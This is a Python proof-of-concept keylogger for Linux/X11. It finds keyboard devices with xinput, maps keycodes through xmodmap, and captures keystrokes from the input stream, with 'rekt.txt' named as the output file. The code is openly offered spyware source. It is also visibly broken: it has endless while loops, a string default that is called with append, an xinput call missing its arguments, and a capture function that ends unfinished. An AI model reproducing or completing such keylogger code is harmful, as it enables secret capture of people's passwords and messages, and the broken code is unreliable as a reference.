### Trivial Keysniffing PoC
import subprocess
import os
import re


class Keysniffer():
        def __init__(self, xinput_bin='/usr/bin/xinput'):
               self.xinput = xinput_bin
               self.keycodes = []
               self.outfile = 'rekt.txt'
               self.keyboards = self.getKeyboards()

               self.getKeyCodes()
        

        def getKeyboards(self):
                """
                Get the device ID for the keyboard from xinput
                """
                # Exec 'xinput list' to get available input devices
                try:
                        xinput_list = subprocess.Popen((self.xinput, 'list'), 
                                stdout=subprocess.PIPE,
                                universal_newlines=True)
                except OSError as err:
                        print('[Error]: '.format(err))
                
                dev_ids = []
                for line in xinput_list.stdout:
                        line = str(line).split()
                        # get devices IDs for devices that have keyboard in the name and
                        # are not Virtual devices.
                        if ("Keyboard" or "keyboard") in line[:-3] and "Virtual" not in line:
                                find_id = re.compile('id=([0-9])')      # regex for id string
                                for item in line:
                                        if find_id.match(item):
                                                # append the last character, which should be
                                                # the numeric device ID.
                                                dev_ids.append(line[line.index(item)][-1])
                                        else:
                                                pass
                        else:
                                pass

                # If dev_ids has less than 1 value, no keyboard devices were found
                if len(dev_ids) < 1: 
                        print("No keyboard devices found.")
                        return
                # else, return the list of device IDs.
                else: return dev_ids


        def getKeyCodes(self):
                """
                Get keycode map using xmodmap and use codes as keys in a dict.
                """
                # Call xmodmap to get keycode mapping, pipe to stdout
                modmap_out = subprocess.Popen(('xmodmap', '-pm', '-pk'), 
                        stdout=subprocess.PIPE,
                        universal_newlines=True)

                # Iterate through output of xmodmap by line, split line into its items,
                # and append that each list of items to codes[] list
                codes = []
                for line in modmap_out.stdout:
                        codes.append(str(line).strip().split())

                # Iterate through the resulting keycode list items
                for line in codes:
                        # Ignore lines with fewer than 2 values (each key from 
                        # xmodmap out has min. of 3 values [code, hex, key])
                        if len(line) < 2:
                                pass
                        else:
                                c1 = str(line[0])
                                # if first item is numeric, its a keycode
                                if c1.isnumeric():
                                        # more than 4 items means there are 2 key values;
                                        # keep both.      
                                        if len(line) > 4: 
                                                code_str = [c1, line[2], line[4]]
                                        else: 
                                                code_str = [c1, line[2]]
                                        
                                        # fill self.keycodes list with resulting list items.
                                        # resulting items will have values in order
                                        # [code, val1, val2]
                                        self.keycodes.append(code_str)


        def findKey(self, code):
                """
                Go through each code string in keycodes map looking for the matching code.
                If the value at the matching code is a normal character, returns the stripped 
                literal character. If the value of the code is Space, return a whitespace string.
                """
                for line in self.keycodes:
                        # select line with matching code
                        if line[0] == str(code):
                                # alphanumeric chars will have a len of 3 since there are
                                # in the format '(x)' at index [1] of the keycode line
                                if len(line[1]) == 3:
                                        return line[1]
                                elif line[1] == '(Space)':
                                        return ' '
                                # if line[1] is greater than 3, it is a special key or 
                                # a punctuation/special character.
                                # TODO: implement function to convert basic special key/chars
                                # key values to their literal representations 
                                elif line[1] > 3:
                                        pass
                        else:
                                continue


        def codesToKeys(self, codes):
                """
                Take a list of codes and return the resulting string.
                """
                in_buffer = list(codes)
                out_buffer = []
                for code in in_buffer:
                        while str(code).isnumeric():
                                out_buffer.append(self.findKey(code))

                final_string = str().join(out_buffer)
                return final_string
                
       
        def keysToCodes(self, search):
                """
                Take a string and return a list of each character's keycode
                """
                # iterate through characters in search string, if it is alphanumeric
                # append parentheses to match xmonad format, and append that string to
                # the search_str[] list
                search_str = []
                for char in search:
                        if str(char).isalnum():
                                search_str.append('(' + char + ')')
                        # TODO: add methods to check for non-alphanumeric characters like
                        # punctuation symbols and others.
                        else:
                                pass
                
                # Iterate through each char in the resulting strings from above.
                # Then iterate through the keycode strings: if the char is in the keycode,
                # append keycode[0] (index 0 is the actual code) to result[]
                result = []
                for char in search_str:
                        for code in self.keycodes:
                                if char in code: result.append(code[0])
                return result


        def keySniff(self):
                """
                Execute xinput to begin sniffing keycodes. Fill a list buffer 
                """

                # Get the code for the Enter key so we know when newlines happen.
                def get_enter_code(enter_code=''):
                        for code in self.keycodes:
                                if code[1] == '(Enter)':
                                        enter_code.append(code[1])
                                        break
                                else:
                                        continue
                enter = get_enter_code()

                # Call xinput to start sniffing keycodes and pipe its output 
                keystream = subprocess.Popen((self.xinput, ), 
                                stdout=subprocess.PIPE, 
                                universal_newlines=True)
                
                
                stream_buffer = []
                for line in keystream.stdout:
                        while len(stream_buffer) > 64:
                                if "release" in line and enter not in line:
                                        code = str(line).strip().split()
                                        stream_buffer.append(code[-1])
                                elif enter in line:
                                        stream_buffer.append('<break>')
                                        break
                
                raw_keys = self.codesToKeys(stream_buffer)
                final_string = ''
                for char in raw_keys:
                        stripped_keys = []
                        stripped_keys.append(char[1])


                
                                        
                
                



        